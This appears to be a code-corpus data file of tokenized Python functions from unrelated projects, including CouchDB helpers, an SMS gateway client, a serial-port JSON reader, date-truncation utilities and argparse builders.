def update_config ( new_config ) : flask_app . base_config . update ( new_config ) # Check for changed working directory. if new_config . has_key ( 'working_directory' ) : wd = os . path . abspath ( new_config [ 'working_directory' ] ) if nbmanager . notebook_dir != wd : if not os . path . exists ( wd ) : raise IOError ( 'Path not found: %s' % wd ) nbmanager . notebook_dir = wd
def end_timing ( self ) : if self . _callback != None : elapsed = time . clock ( ) * 1000 - self . _start self . _callback . end_timing ( self . _counter , elapsed )
def FromJsonString ( self , value ) : self . Clear ( ) for path in value . split ( ',' ) : self . paths . append ( path )
def get_doc ( doc_id , db_name , server_url = 'http://127.0.0.1:5984/' , rev = None ) : db = get_server ( server_url ) [ db_name ] if rev : headers , response = db . resource . get ( doc_id , rev = rev ) return couchdb . client . Document ( response ) return db [ doc_id ]
def read ( readme ) : extend = os . path . splitext ( readme ) [ 1 ] if ( extend == '.rst' ) : import codecs return codecs . open ( readme , 'r' , 'utf-8' ) . read ( ) elif ( extend == '.md' ) : import pypandoc return pypandoc . convert ( readme , 'rst' )
def main ( ) : plugin = Register ( ) if plugin . args . option == 'sql' : plugin . sql_handle ( ) elif plugin . args . option == 'database-used' : plugin . database_used_handle ( ) elif plugin . args . option == 'databaselog-used' : plugin . database_log_used_handle ( ) else : plugin . unknown ( "Unknown actions." )
def remove ( self , collection , * * kwargs ) : callback = kwargs . pop ( 'callback' ) yield Op ( self . db [ collection ] . remove , kwargs ) callback ( )
def _api_call ( self , method_name , * args , * * kwargs ) : params = kwargs . setdefault ( 'params' , { } ) params . update ( { 'key' : self . _apikey } ) if self . _token is not None : params . update ( { 'token' : self . _token } ) http_method = getattr ( requests , method_name ) return http_method ( TRELLO_URL + self . _url , * args , * * kwargs )
def arkt_to_unixt ( ark_timestamp ) : res = datetime . datetime ( 2017 , 3 , 21 , 15 , 55 , 44 ) + datetime . timedelta ( seconds = ark_timestamp ) return res . timestamp ( )
def close ( self ) : try : self . conn . close ( ) self . logger . debug ( "Close connect succeed." ) except pymssql . Error as e : self . unknown ( "Close connect error: %s" % e )
def splitext_files_only ( filepath ) : return ( ( filepath , '' ) if os . path . isdir ( filepath ) else os . path . splitext ( filepath ) )
def set_time ( filename , mod_time ) : log . debug ( 'Setting modified time to %s' , mod_time ) mtime = calendar . timegm ( mod_time . utctimetuple ( ) ) mtime += mod_time . microsecond / 1000000 atime = os . stat ( filename ) . st_atime os . utime ( filename , ( atime , mtime ) )
def get_time ( filename ) : ts = os . stat ( filename ) . st_mtime return datetime . datetime . utcfromtimestamp ( ts )
def ensure_dir_exists ( func ) : @ functools . wraps ( func ) def make_if_not_present ( ) : dir = func ( ) if not os . path . isdir ( dir ) : os . makedirs ( dir ) return dir return make_if_not_present
def age ( self ) : # 0 means this composer will never decompose if self . rounds == 1 : self . do_run = False elif self . rounds > 1 : self . rounds -= 1
def run ( self ) : if not self . device : return try : data = "" while ( self . do_run ) : try : if ( self . device . inWaiting ( ) > 1 ) : l = self . device . readline ( ) [ : - 2 ] l = l . decode ( "UTF-8" ) if ( l == "[" ) : # start recording data = "[" elif ( l == "]" ) and ( len ( data ) > 4 ) and ( data [ 0 ] == "[" ) : # now parse the input data = data + "]" self . store . register_json ( data ) self . age ( ) elif ( l [ 0 : 3 ] == "  {" ) : # this is a data line data = data + " " + l else : # this is a slow interface - give it some time sleep ( 1 ) # then count down.. self . age ( ) except ( UnicodeDecodeError , ValueError ) : # only accepting unicode: throw away the whole bunch data = "" # and count down the exit condition self . age ( ) except serial . serialutil . SerialException : print ( "Could not connect to the serial line at " + self . device_name )
def getbalance ( self , url = 'http://services.ambientmobile.co.za/credits' ) : postXMLList = [ ] postXMLList . append ( "<api-key>%s</api-key>" % self . api_key ) postXMLList . append ( "<password>%s</password>" % self . password ) postXML = '<sms>%s</sms>' % "" . join ( postXMLList ) result = self . curl ( url , postXML ) if result . get ( "credits" , None ) : return result [ "credits" ] else : raise AmbientSMSError ( result [ "status" ] )
def sendmsg ( self , message , recipient_mobiles = [ ] , url = 'http://services.ambientmobile.co.za/sms' , concatenate_message = True , message_id = str ( time ( ) ) . replace ( "." , "" ) , reply_path = None , allow_duplicates = True , allow_invalid_numbers = True , ) : if not recipient_mobiles or not ( isinstance ( recipient_mobiles , list ) or isinstance ( recipient_mobiles , tuple ) ) : raise AmbientSMSError ( "Missing recipients" ) if not message or not len ( message ) : raise AmbientSMSError ( "Missing message" ) postXMLList = [ ] postXMLList . append ( "<api-key>%s</api-key>" % self . api_key ) postXMLList . append ( "<password>%s</password>" % self . password ) postXMLList . append ( "<recipients>%s</recipients>" % "" . join ( [ "<mobile>%s</mobile>" % m for m in recipient_mobiles ] ) ) postXMLList . append ( "<msg>%s</msg>" % message ) postXMLList . append ( "<concat>%s</concat>" % ( 1 if concatenate_message else 0 ) ) postXMLList . append ( "<message_id>%s</message_id>" % message_id ) postXMLList . append ( "<allow_duplicates>%s</allow_duplicates>" % ( 1 if allow_duplicates else 0 ) ) postXMLList . append ( "<allow_invalid_numbers>%s</allow_invalid_numbers>" % ( 1 if allow_invalid_numbers else 0 ) ) if reply_path : postXMLList . append ( "<reply_path>%s</reply_path>" % reply_path ) postXML = '<sms>%s</sms>' % "" . join ( postXMLList ) result = self . curl ( url , postXML ) status = result . get ( "status" , None ) if status and int ( status ) in [ 0 , 1 , 2 ] : return result else : raise AmbientSMSError ( int ( status ) )
def curl ( self , url , post ) : try : req = urllib2 . Request ( url ) req . add_header ( "Content-type" , "application/xml" ) data = urllib2 . urlopen ( req , post . encode ( 'utf-8' ) ) . read ( ) except urllib2 . URLError , v : raise AmbientSMSError ( v ) return dictFromXml ( data )
def is_date_type ( cls ) : if not isinstance ( cls , type ) : return False return issubclass ( cls , date ) and not issubclass ( cls , datetime )
def truncate ( when , unit , week_start = mon ) : if is_datetime ( when ) : if unit == millisecond : return when . replace ( microsecond = int ( round ( when . microsecond / 1000.0 ) ) * 1000 ) elif unit == second : return when . replace ( microsecond = 0 ) elif unit == minute : return when . replace ( second = 0 , microsecond = 0 ) elif unit == hour : return when . replace ( minute = 0 , second = 0 , microsecond = 0 ) elif unit == day : return when . replace ( hour = 0 , minute = 0 , second = 0 , microsecond = 0 ) elif unit == week : weekday = prevweekday ( when , week_start ) return when . replace ( year = weekday . year , month = weekday . month , day = weekday . day , hour = 0 , minute = 0 , second = 0 , microsecond = 0 ) elif unit == month : return when . replace ( day = 1 , hour = 0 , minute = 0 , second = 0 , microsecond = 0 ) elif unit == year : return when . replace ( month = 1 , day = 1 , hour = 0 , minute = 0 , second = 0 , microsecond = 0 ) elif is_date ( when ) : if unit == week : return prevweekday ( when , week_start ) elif unit == month : return when . replace ( day = 1 ) elif unit == year : return when . replace ( month = 1 , day = 1 ) elif is_time ( when ) : if unit == millisecond : return when . replace ( microsecond = int ( when . microsecond / 1000.0 ) * 1000 ) elif unit == second : return when . replace ( microsecond = 0 ) elif unit == minute : return when . replace ( second = 0 , microsecond = 0 ) return when
def weekday ( when , weekday , start = mon ) : if isinstance ( when , datetime ) : when = when . date ( ) today = when . weekday ( ) delta = weekday - today if weekday < start and today >= start : delta += 7 elif weekday >= start and today < start : delta -= 7 return when + timedelta ( days = delta )
def get_db_from_db ( db_string ) : server = get_server_from_db ( db_string ) local_match = PLAIN_RE . match ( db_string ) remote_match = URL_RE . match ( db_string ) # If this looks like a local specifier: if local_match : return server [ local_match . groupdict ( ) [ 'database' ] ] elif remote_match : return server [ remote_match . groupdict ( ) [ 'database' ] ] raise ValueError ( 'Invalid database string: %r' % ( db_string , ) )
def ensure_specifier_exists ( db_spec ) : local_match = LOCAL_RE . match ( db_spec ) remote_match = REMOTE_RE . match ( db_spec ) plain_match = PLAIN_RE . match ( db_spec ) if local_match : db_name = local_match . groupdict ( ) . get ( 'database' ) server = shortcuts . get_server ( ) if db_name not in server : server . create ( db_name ) return True elif remote_match : hostname , portnum , database = map ( remote_match . groupdict ( ) . get , ( 'hostname' , 'portnum' , 'database' ) ) server = shortcuts . get_server ( server_url = ( 'http://%s:%s' % ( hostname , portnum ) ) ) if database not in server : server . create ( database ) return True elif plain_match : db_name = plain_match . groupdict ( ) . get ( 'database' ) server = shortcuts . get_server ( ) if db_name not in server : server . create ( db_name ) return True return False
def get_events_vote_cluster ( self , delegate_address ) : delegate_pubkey = self . account_details ( address = delegate_address ) [ 'public_key' ] plusvote = '+{delegate_pubkey}' . format ( delegate_pubkey = delegate_pubkey ) resultset = self . _cursor . execute_and_fetchall ( . format ( address = delegate_address , transactions = self . scheme [ 'transactions' ] , blocks = self . scheme [ 'blocks' ] , mem_accounts = self . scheme [ 'mem_accounts' ] , mem_accounts2delegates = self . scheme [ 'mem_accounts2delegates' ] , votes = self . scheme [ 'votes' ] , plusvote = plusvote ) ) res = { } for i in resultset : if i [ 1 ] == 'transaction' : res . update ( { i [ 0 ] : { 'tx_id' : i [ 0 ] , 'event_type' : i [ 1 ] , 'amount' : i [ 2 ] , 'timestamp' : i [ 3 ] , 'recipient_id' : i [ 4 ] , 'sender_id' : i [ 5 ] , 'rawasset' : i [ 6 ] , 'type' : i [ 7 ] , 'fee' : i [ 8 ] , 'block_id' : i [ 9 ] , 'height' : i [ 10 ] } } ) elif i [ 1 ] == 'block' : res . update ( { i [ 0 ] : { 'block_id' : i [ 0 ] , 'event_type' : i [ 1 ] , 'reward' : i [ 2 ] , 'total_fee' : i [ 3 ] , 'timestamp' : i [ 8 ] , 'address' : i [ 5 ] , 'username' : i [ 6 ] , 'public_key' : i [ 4 ] , 'height' : i [ 10 ] } } ) return res
def create_commands ( self , commands , parser ) : self . apply_defaults ( commands ) def create_single_command ( command ) : keys = command [ 'keys' ] del command [ 'keys' ] kwargs = { } for item in command : kwargs [ item ] = command [ item ] parser . add_argument ( * keys , * * kwargs ) if len ( commands ) > 1 : for command in commands : create_single_command ( command ) else : create_single_command ( commands [ 0 ] )
def create_subparsers ( self , parser ) : subparsers = parser . add_subparsers ( ) for name in self . config [ 'subparsers' ] : subparser = subparsers . add_parser ( name ) self . create_commands ( self . config [ 'subparsers' ] [ name ] , subparser )
def show_version ( self ) : class ShowVersionAction ( argparse . Action ) : def __init__ ( inner_self , nargs = 0 , * * kw ) : super ( ShowVersionAction , inner_self ) . __init__ ( nargs = nargs , * * kw ) def __call__ ( inner_self , parser , args , value , option_string = None ) : print ( "{parser_name} version: {version}" . format ( parser_name = self . config . get ( "parser" , { } ) . get ( "prog" ) , version = self . prog_version ) ) return ShowVersionAction
def check_path_action ( self ) : class CheckPathAction ( argparse . Action ) : def __call__ ( self , parser , args , value , option_string = None ) : if type ( value ) is list : value = value [ 0 ] user_value = value if option_string == 'None' : if not os . path . isdir ( value ) : _current_user = os . path . expanduser ( "~" ) if not value . startswith ( _current_user ) and not value . startswith ( os . getcwd ( ) ) : if os . path . isdir ( os . path . join ( _current_user , value ) ) : value = os . path . join ( _current_user , value ) elif os . path . isdir ( os . path . join ( os . getcwd ( ) , value ) ) : value = os . path . join ( os . getcwd ( ) , value ) else : value = None else : value = None elif option_string == '--template-name' : if not os . path . isdir ( value ) : if not os . path . isdir ( os . path . join ( args . target , value ) ) : value = None if not value : logger . error ( "Could not to find path %s. Please provide " "correct path to %s option" , user_value , option_string ) exit ( 1 ) setattr ( args , self . dest , value ) return CheckPathAction
def _AddPropertiesForExtensions ( descriptor , cls ) : extension_dict = descriptor . extensions_by_name for extension_name , extension_field in extension_dict . items ( ) : constant_name = extension_name . upper ( ) + "_FIELD_NUMBER" setattr ( cls , constant_name , extension_field . number )
